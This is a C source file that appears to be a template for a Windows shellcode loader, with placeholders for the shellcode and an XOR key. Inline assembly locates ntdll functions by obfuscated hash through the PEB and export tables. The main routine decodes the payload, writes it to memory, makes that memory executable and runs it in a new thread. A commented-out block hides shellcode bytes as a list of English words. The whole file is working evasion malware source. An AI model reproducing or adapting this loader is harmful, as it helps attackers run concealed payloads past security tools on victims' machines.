#include "config.h"


// #define TAILLE 256

// const char* message = "by walk eye off really last into is is is might watch might eat walk need left such down is is is let walk need then walk play all is is is name walk side is walk play well around tree said watch walk group next walk city sometimes well around tree said walk side let find walk need next leave walk need next sea walk side let live walk side animal eat walk has even grow grow hear need enough walk out here walk need left great keep place country are does live might few enough am walk down enough might was few why always let might watch walk side let live side close keep walk was up sentence city answer find will are letter school side tree paper is is is walk story left page house walk was up side walk find open side turn live began was up eat again year hear need enough walk down enough might side change paper walk was now walk need left great might few enough am might was few study well letter almost carry be carry help said begin learn out letter very time open side turn help began was up sentence might side would walk open side turn made began was up might side have paper might time walk was up walk play one on about can might time part number way might time might number might way walk eye often live might let walk play one on about can down well time might number way walk side go never start down down down day last will is is is letter house name animal try move ask thing men men is number might kind call picture set well down first might different is is is is last were is is is walk name men men hand is way last had is is is began home sentence hand is might time walk need enough might kind country also people learn down first walk need enough might kind where where am time down first is is is is is is is is is is is is is is is is is is is is is is is is is is was is is is have is almost down is is is is is is is is is is is is is is is is for is is is is is was is is look turn is is is is is is is is is is is is is been is is is is is was is do look turn is is is is is is is is is is is is is set is is is is is was is begin look turn is is is is is is is is is is is is is add is is is is is was is talk look turn is is is is is is is is is is is is is carry is is is is is was is part look turn is is is is is is is is is is is is is place is is is is is was is farm look turn is is is is is is is is is is is is is air is is is is is was is mountain look turn is is is is is is is is is is is is is father is is is is is was is long look turn is is is is is is is is is is is is is state is is is is is was is big look turn is is is is is is is is is is is is is mountain is is is is is was is left look turn is is is is is is is is is is is is is one is is is is is was is by look turn is is is is is is is is is is is is is other is is is is is was is about look turn is is is is is is is is is is is is is small is is is is is was is said write turn is is is is is is is is is is is is is next is is is is is was is did write turn is is is is is is is is is is is is is out is is is is is was is try write turn is is is is is is is is is is is is is before is is is is is was is thought write turn is is is is is is is is is is is is is near is is is is is was is turn write turn is is is is is is is is is is is is is for is is is look is is is is is is is is is is is is is is is is is is is sometimes is is is look is was is is live turn is is is is is is is is is is is is is into is is is look is was is is live turn is is is is is is is is is is is is is had was is is look is was is is live turn is is is is is is is is is is is is is is page name land picture went house line name men men back hand thing name ask home place house land is land name page place house picture men hand boy page sound year men hand back end sound place picture boy is men hand place thing sound land hand thing letter men name sound home place land name is land hand thing letter men name sound line place house line sound men hand hand picture is house end boy picture sound back place house name sound place thing farm letter house page land name home page is boy house sound point place men boy thing sound land hand thing letter men name is sentence boy home thing sound sentence letter home back page boy hand home is sentence letter home back page boy hand home sound line place house line sound men hand hand picture is back line name back end is sentence boy home place men is picture animal name sound men hand place thing sound home name answer page sound land hand thing letter men name is house place point name sound year name man boy home home boy home man is men hand place thing sound being cut begin let try move open carry carry is men hand place thing sound walk begin carry carry miss is men hand place thing sound began stop got miss is men hand place thing sound line place house line name house is sound sound year house house sound house page place animal page is sound name thing place page place is sound name home thing is is ask house America land page place year is ask house page animal page place year is ask house line house page animal page place year is ask page name answer page is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is is come is is is was is is is were is is is is is is is";

// typedef struct {
//     char mot[10];
//     unsigned char octet;
// } Association;

// Association tableau[TAILLE] = {
//     {"is", 0x00},
//     {"was", 0x01},
//     {"are", 0x02},
//     {"be", 0x03},
//     {"have", 0x04},
//     {"had", 0x05},
//     {"were", 0x06},
//     {"can", 0x07},
//     {"said", 0x08},
//     {"use", 0x09},
//     {"do", 0x0A},
//     {"will", 0x0B},
//     {"would", 0x0C},
//     {"make", 0x0D},
//     {"like", 0x0E},
//     {"has", 0x0F},
//     {"look", 0x10},
//     {"write", 0x11},
//     {"go", 0x12},
//     {"see", 0x13},
//     {"could", 0x14},
//     {"been", 0x15},
//     {"call", 0x16},
//     {"am", 0x17},
//     {"find", 0x18},
//     {"did", 0x19},
//     {"get", 0x1A},
//     {"come", 0x1B},
//     {"made", 0x1C},
//     {"may", 0x1D},
//     {"take", 0x1E},
//     {"know", 0x1F},
//     {"live", 0x20},
//     {"give", 0x21},
//     {"think", 0x22},
//     {"say", 0x23},
//     {"help", 0x24},
//     {"tell", 0x25},
//     {"follow", 0x26},
//     {"came", 0x27},
//     {"want", 0x28},
//     {"show", 0x29},
//     {"set", 0x2A},
//     {"put", 0x2B},
//     {"does", 0x2C},
//     {"must", 0x2D},
//     {"ask", 0x2E},
//     {"went", 0x2F},
//     {"read", 0x30},
//     {"need", 0x31},
//     {"move", 0x32},
//     {"try", 0x33},
//     {"change", 0x34},
//     {"play", 0x35},
//     {"spell", 0x36},
//     {"found", 0x37},
//     {"study", 0x38},
//     {"learn", 0x39},
//     {"should", 0x3A},
//     {"add", 0x3B},
//     {"keep", 0x3C},
//     {"start", 0x3D},
//     {"thought", 0x3E},
//     {"saw", 0x3F},
//     {"turn", 0x40},
//     {"might", 0x41},
//     {"close", 0x42},
//     {"seem", 0x43},
//     {"open", 0x44},
//     {"begin", 0x45},
//     {"got", 0x46},
//     {"run", 0x47},
//     {"walk", 0x48},
//     {"began", 0x49},
//     {"grow", 0x4A},
//     {"took", 0x4B},
//     {"carry", 0x4C},
//     {"hear", 0x4D},
//     {"stop", 0x4E},
//     {"miss", 0x4F},
//     {"eat", 0x50},
//     {"watch", 0x51},
//     {"let", 0x52},
//     {"cut", 0x53},
//     {"talk", 0x54},
//     {"being", 0x55},
//     {"leave", 0x56},
//     {"word", 0x57},
//     {"time", 0x58},
//     {"number", 0x59},
//     {"way", 0x5A},
//     {"people", 0x5B},
//     {"water", 0x5C},
//     {"day", 0x5D},
//     {"part", 0x5E},
//     {"sound", 0x5F},
//     {"work", 0x60},
//     {"place", 0x61},
//     {"year", 0x62},
//     {"back", 0x63},
//     {"thing", 0x64},
//     {"name", 0x65},
//     {"sentence", 0x66},
//     {"man", 0x67},
//     {"line", 0x68},
//     {"boy", 0x69},
//     {"farm", 0x6A},
//     {"end", 0x6B},
//     {"men", 0x6C},
//     {"land", 0x6D},
//     {"home", 0x6E},
//     {"hand", 0x6F},
//     {"picture", 0x70},
//     {"air", 0x71},
//     {"animal", 0x72},
//     {"house", 0x73},
//     {"page", 0x74},
//     {"letter", 0x75},
//     {"point", 0x76},
//     {"mother", 0x77},
//     {"answer", 0x78},
//     {"America", 0x79},
//     {"world", 0x7A},
//     {"food", 0x7B},
//     {"country", 0x7C},
//     {"plant", 0x7D},
//     {"school", 0x7E},
//     {"father", 0x7F},
//     {"tree", 0x80},
//     {"city", 0x81},
//     {"earth", 0x82},
//     {"eye", 0x83},
//     {"head", 0x84},
//     {"story", 0x85},
//     {"example", 0x86},
//     {"life", 0x87},
//     {"paper", 0x88},
//     {"group", 0x89},
//     {"children", 0x8A},
//     {"side", 0x8B},
//     {"feet", 0x8C},
//     {"car", 0x8D},
//     {"mile", 0x8E},
//     {"night", 0x8F},
//     {"sea", 0x90},
//     {"river", 0x91},
//     {"state", 0x92},
//     {"book", 0x93},
//     {"idea", 0x94},
//     {"face", 0x95},
//     {"Indian", 0x96},
//     {"girl", 0x97},
//     {"mountain", 0x98},
//     {"list", 0x99},
//     {"song", 0x9A},
//     {"family", 0x9B},
//     {"he", 0x9C},
//     {"a", 0x9D},
//     {"one", 0x9E},
//     {"all", 0x9F},
//     {"an", 0xA0},
//     {"each", 0xA1},
//     {"other", 0xA2},
//     {"many", 0xA3},
//     {"some", 0xA4},
//     {"two", 0xA5},
//     {"more", 0xA6},
//     {"long", 0xA7},
//     {"new", 0xA8},
//     {"little", 0xA9},
//     {"most", 0xAA},
//     {"good", 0xAB},
//     {"great", 0xAC},
//     {"right", 0xAD},
//     {"mean", 0xAE},
//     {"old", 0xAF},
//     {"any", 0xB0},
//     {"same", 0xB1},
//     {"three", 0xB2},
//     {"small", 0xB3},
//     {"another", 0xB4},
//     {"large", 0xB5},
//     {"big", 0xB6},
//     {"even", 0xB7},
//     {"such", 0xB8},
//     {"different", 0xB9},
//     {"kind", 0xBA},
//     {"still", 0xBB},
//     {"high", 0xBC},
//     {"every", 0xBD},
//     {"own", 0xBE},
//     {"light", 0xBF},
//     {"left", 0xC0},
//     {"few", 0xC1},
//     {"next", 0xC2},
//     {"hard", 0xC3},
//     {"both", 0xC4},
//     {"important", 0xC5},
//     {"white", 0xC6},
//     {"four", 0xC7},
//     {"second", 0xC8},
//     {"enough", 0xC9},
//     {"above", 0xCA},
//     {"young", 0xCB},
//     {"not", 0xCC},
//     {"when", 0xCD},
//     {"there", 0xCE},
//     {"how", 0xCF},
//     {"up", 0xD0},
//     {"out", 0xD1},
//     {"then", 0xD2},
//     {"so", 0xD3},
//     {"no", 0xD4},
//     {"first", 0xD5},
//     {"now", 0xD6},
//     {"only", 0xD7},
//     {"very", 0xD8},
//     {"just", 0xD9},
//     {"where", 0xDA},
//     {"much", 0xDB},
//     {"before", 0xDC},
//     {"too", 0xDD},
//     {"also", 0xDE},
//     {"around", 0xDF},
//     {"well", 0xE0},
//     {"here", 0xE1},
//     {"why", 0xE2},
//     {"again", 0xE3},
//     {"off", 0xE4},
//     {"away", 0xE5},
//     {"near", 0xE6},
//     {"below", 0xE7},
//     {"last", 0xE8},
//     {"never", 0xE9},
//     {"always", 0xEA},
//     {"together", 0xEB},
//     {"often", 0xEC},
//     {"once", 0xED},
//     {"later", 0xEE},
//     {"far", 0xEF},
//     {"really", 0xF0},
//     {"almost", 0xF1},
//     {"sometimes", 0xF2},
//     {"soon", 0xF3},
//     {"of", 0xF4},
//     {"to", 0xF5},
//     {"in", 0xF6},
//     {"for", 0xF7},
//     {"on", 0xF8},
//     {"with", 0xF9},
//     {"at", 0xFA},
//     {"from", 0xFB},
//     {"by", 0xFC},
//     {"about", 0xFD},
//     {"into", 0xFE},
//     {"down", 0xFF},
// };

typedef NTSYSAPI NTSTATUS (NTAPI* NtAllocVirtMem)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSYSAPI NTSTATUS(NTAPI* NtWriteVirtMem)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
);

typedef NTSYSAPI NTSTATUS(NTAPI* NtProtectVirtMem)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
);

typedef NTSYSAPI NTSTATUS(NTAPI* NtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PCRYPT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSYSAPI NTSTATUS(NTAPI* NtWaitForSingleObj)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);

HMODULE CustomGetModuleHandle(unsigned int module_hash) {
    void* module_base = NULL;
    #ifdef _WIN64
        __asm__ (
            // Initialize r10d with hash and set up PEB access
            "xor %%rax, %%rax\n\t"
            "movl %[hash], %%r10d\n\t"  
            "xor %%r9d, %%r9d\n\t"
            "mov $0xff, %%rax\n\t"
            "xor %%rdx, %%rdx\n\t"
            "xor $0x9f, %%rax\n\t"
            "mov %%gs:(%%rax), %%rax\n\t"
            "xor $947851, %%rax\n\t"
            "mov $1000, %%r9d\n\t"
            "mov %%rax, %%rdx\n\t"
            "xor $947851, %%rdx\n\t"          
            "mov 0x18(%%rdx), %%rdx\n\t"
            "xor %%rax, %%rdx\n\t"
            "shl $0x4, %%r9d\n\t"
            "xor %%rax, %%rdx\n\t"
            "mov 0x20(%%rdx), %%rdx\n\t"
        "load_module_name:\n\t"
            "mov 0x50(%%rdx), %%rsi\n\t"      // FullDllName.Buffer
            "movzwq 0x4A(%%rdx), %%rcx\n\t"   // Length (16-bit to 64-bit)
            "xor %%r9d, %%r9d\n\t"            // Clear hash accumulator
        "module_hash_loop:\n\t"
            "xor %%rax, %%rax\n\t"
            "lodsb\n\t"                       // Load byte into AL
            "cmp $0x61, %%al\n\t"             // Compare with 'a'
            "jl skip_case_adjustment\n\t"
            "sub $0x20, %%al\n\t"             // Convert to uppercase
        "skip_case_adjustment:\n\t"
            "rol $17, %%r9d\n\t"              // Rotate left by 13 bits
            "add %%eax, %%r9d\n\t"            // Add AL to hash
            "loop module_hash_loop\n\t"
        "then:\n\t"
            "cmp %%r10d, %%r9d\n\t"           // Compare hash
            "je found\n\t"                     // If equal, jump to found
        "load_next_module:\n\t"
            "mov (%%rdx), %%rdx\n\t"          // Next module
            "jmp load_module_name\n\t"
        "found:\n\t"
            "mov %%rdx, %[result]\n\t"            // Store result
            : [result] "=r" (module_base)              // Output
            : [hash] "r" (module_hash)                // Input
            : "rax", "rdx", "rsi", "rcx", "r9", "r10", "memory"  // Clobbers
        );
    #else
        // 32-bit code TODO
    #endif
    return module_base;
}


FARPROC CustomGetProcAdress(IN HMODULE hModule, unsigned int function_hash) {
    if (hModule == NULL) {
        return NULL;
    }
    void* function_base = NULL;
    #ifdef _WIN64
        __asm__ (
            // Initialize r10d with hash and set up PEB access
            "xor %%r9d, %%r9d\n\t"
            "mov %[module], %%rdx\n\t"
            "xor %%rax, %%rax\n\t"
            "mov $0x40, %%rax\n\t"
            "push %%rax\n\t"
            "mov $47651200, %%r9d\n\t"
            "movl %[hash], %%r10d\n\t"  
            "shr $1, %%rax\n\t"
            "add %%rdx, %%rax\n\t"
            "mov (%%rax), %%rdx\n\t" // rdx+0x20
            "mov %%rdx, %%r8\n\t"
            "mov $0x7e, %%rbx\n\t"
            "push %%rbx\n\t"
            "sub $0x42, %%rdx\n\t"
            "xor $5454, %%r9d\n\t"
            "add %%rbx, %%rdx\n\t"
            "mov (%%rdx), %%eax\n\t" // rdx+0x3C
            "mov %%r8, %%rdx\n\t"
            "add %%rdx, %%rax\n\t"
            "pop %%rbx\n\t"
            "add $0xa, %%rbx\n\t"
            "add %%rax, %%rbx\n\t"
            "mov (%%rbx), %%eax\n\t" // rax+0x88
            "add %%rdx, %%rax\n\t"
            "push %%rax\n\t"
            "mov $0x18, %%r9\n\t"
            "add %%r9, %%rax\n\t"
            "mov (%%rax), %%ecx\n\t" // rax+0x18
            "pop %%rax\n\t"
            "pop %%rbx\n\t"
            "shr $1, %%rbx\n\t"
            "add %%rax, %%rbx\n\t"
            "mov (%%rbx), %%r8d\n\t" // rax+0x20
            "add %%rdx, %%r8\n\t"
            "push %%rax\n\t"
        "find_function:\n\t"
            "jrcxz final\n\t"
            "xor %%r9d, %%r9d\n\t"            // Clear hash accumulator
            "dec %%rcx\n\t"                   // Decrement number of functions
            "mov (%%r8, %%rcx, 4), %%esi\n\t" // Load function name RVA
            "add %%rdx, %%rsi\n\t"            // Calculate function name VA
        "function_hash_loop:\n\t"
            "xor %%rax, %%rax\n\t"
            "lodsb\n\t"                       // Load byte into AL
            "ror $23, %%r9d\n\t"              // Rotate right by 23 bits
            "add %%eax, %%r9d\n\t"            // Add AL to hash
            "cmp %%ah, %%al\n\t"
            "jnz function_hash_loop\n\t"
        "next:\n\t"
            "cmp %%r10d, %%r9d\n\t"           // Compare hash
            "jnz find_function\n\t"           // If equal, jump to found
        "final:\n\t"
            "pop %%rax\n\t"
            "mov 0x24(%%rax), %%r8d\n\t"
            "add %%rdx, %%r8\n\t"
            "mov (%%r8, %%rcx, 2), %%cx\n\t"
            "mov 0x1c(%%rax), %%r8d\n\t"
            "add %%rdx, %%r8\n\t"
            "mov (%%r8, %%rcx, 4), %%eax\n\t"
            "add %%rdx, %%rax\n\t"
            "mov %%rax, %[result]\n\t"
            : [result] "=r" (function_base)                      // Output
            : [hash] "r" (function_hash), [module] "r" ((uintptr_t)hModule)                // Input
            : "rax", "rbx", "rdx", "rsi", "rcx", "r8", "r9", "r10", "memory"  // Clobbers
        );
        
    #else
        // 32-bit code TODO
    #endif
    return function_base;
}

void main() {
    
    unsigned char payload[] = "%SHELLCODE%";
    BYTE key = %XOR_KEY%;
    PVOID exec = NULL;
    DWORD old_protect = 0;
    HANDLE th;
    BOOL rv;

    unsigned int ndtll_hash = 0x69e00346;   // ROL17
    unsigned int virtual_alloc_hash = 0x96124679; // ROR23
    unsigned int write_memory_hash = 0x92136911; // ROR23
    unsigned int virtual_protect_hash = 0xd62f6483; // ROR23
    unsigned int create_thread_hash = 0xdd007761; // ROR23
    unsigned int wait_for_single_object_hash = 0xde23aac9; // ROR23

    HMODULE hNtdll = CustomGetModuleHandle(ndtll_hash);

    NtAllocVirtMem _NtAlocVirtMem = (NtAllocVirtMem)CustomGetProcAdress(hNtdll, virtual_alloc_hash);
    NtWriteVirtMem _NtWriteVirtMem = (NtWriteVirtMem)CustomGetProcAdress(hNtdll, write_memory_hash);
    NtProtectVirtMem _NtProtectVirtMem = (NtProtectVirtMem)CustomGetProcAdress(hNtdll, virtual_protect_hash);
    NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)CustomGetProcAdress(hNtdll, create_thread_hash);
    NtWaitForSingleObj _NtWaitForSingleObj = (NtWaitForSingleObj)CustomGetProcAdress(hNtdll, wait_for_single_object_hash);

    
    
    
    // XORing shellcode
    // int assoc_size = sizeof(tableau) / sizeof(tableau[0]);

    // unsigned char payload[TAILLE] = {0};
    // int result_index = 0;

    // // Dupliquer la chaîne pour la tokeniser
    // char buffer[TAILLE*8];
    // strcpy(buffer, message);

    // // Découper la chaîne en mots
    // char *token = strtok(buffer, " ");
    // while (token != NULL) {
    //     for (int i = 0; i < assoc_size; i++) {
    //         if (strcmp(token, tableau[i].mot) == 0) {
    //             payload[result_index++] = tableau[i].octet;
    //             break;
    //         }
    //     }
    //     token = strtok(NULL, " ");
    // } 

    // unsigned char *payload = DICT_decrypt(message);

    SIZE_T regionSize = sizeof(payload);



    // Allocating executable memory
    _NtAlocVirtMem((HANDLE)-1, &exec, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    XOR(payload,sizeof(payload),key);

    // Copy shellcode into allocated memory
    _NtWriteVirtMem((HANDLE)-1, exec, payload, sizeof(payload), NULL);

    // Changing memory protection to PAGE_EXECUTE_READ
    _NtProtectVirtMem((HANDLE)-1, &exec, &regionSize, PAGE_EXECUTE_READ, &old_protect);

    // Executing shellcode in a new thread
    _NtCreateThreadEx(&th, GENERIC_ALL, NULL, (HANDLE)-1, exec, NULL, FALSE, (ULONG_PTR)NULL, (SIZE_T)NULL, (SIZE_T)NULL, NULL);

    // Waiting for thread to finish
    _NtWaitForSingleObj(th, FALSE, NULL);
}

